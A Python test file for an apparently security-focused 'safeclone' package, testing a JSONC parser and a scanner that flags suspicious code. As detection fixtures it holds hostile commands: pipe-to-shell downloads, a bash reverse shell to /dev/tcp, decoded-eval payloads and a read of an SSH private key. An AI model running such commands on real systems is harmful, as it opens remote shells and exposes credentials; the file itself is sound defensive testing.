from safeclone import jsonc
from safeclone.patterns import scan_text, worst


def test_jsonc_comments_and_trailing_commas():
    text = '{\n // c\n "a": "http://x//y", /* b */ "t": [1,2,],\n}'
    assert jsonc.loads(text) == {"a": "http://x//y", "t": [1, 2]}


def test_jsonc_invalid_returns_none():
    assert jsonc.loads("{nope") is None


def test_jsonc_bom_and_escaped_quote():
    assert jsonc.loads('\ufeff{"a": "q\\"//x"}') == {"a": 'q"//x'}


def rules(text):
    return {r for r, *_ in scan_text(text)}


def test_pipe_to_shell():
    assert "pipe-to-shell" in rules("curl -fsSL https://x.invalid/i.sh | bash")
    assert "pipe-to-shell" in rules("wget -qO- http://a | sudo sh")
    assert "pipe-to-shell" not in rules("curl -o file.tgz https://x")


def test_eval_decoded_and_function():
    assert "eval-decoded" in rules("eval(atob('Y29uc29sZQ=='))")
    assert "eval-decoded" in rules("exec(base64.b64decode(b'cHJpbnQ='))")
    assert "function-constructor" in rules("new Function(String.fromCharCode(99))")


def test_hidden_far_right_and_unicode():
    assert "hidden-far-right" in rules("module.exports = {};" + " " * 200 + "eval(x)")
    assert "hidden-unicode" in rules("if (a\u202e) {}")
    assert "hidden-unicode" not in rules("plain ascii")


def test_hosts_and_creds():
    assert "paste-payload-host" in rules("fetch('https://api.npoint.io/abc')")
    assert "raw-ip-url" in rules("http://203.0.113.7:1224/x")
    assert "raw-ip-url" not in rules("http://127.0.0.1:3000/")
    assert "credential-paths" in rules("readFile(home + '/.ssh/id_ed25519')")
    assert "reverse-shell" in rules("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")


def test_obfuscated_line():
    line = "var _0x1a2b=[" + ",".join("'\\x%02x'" % (i % 256) for i in range(1500)) + "];"
    assert "obfuscated-line" in rules(line)


def test_worst():
    assert worst(["low", "critical", "high"]) == "critical"
    assert worst([], default="clean") == "clean"
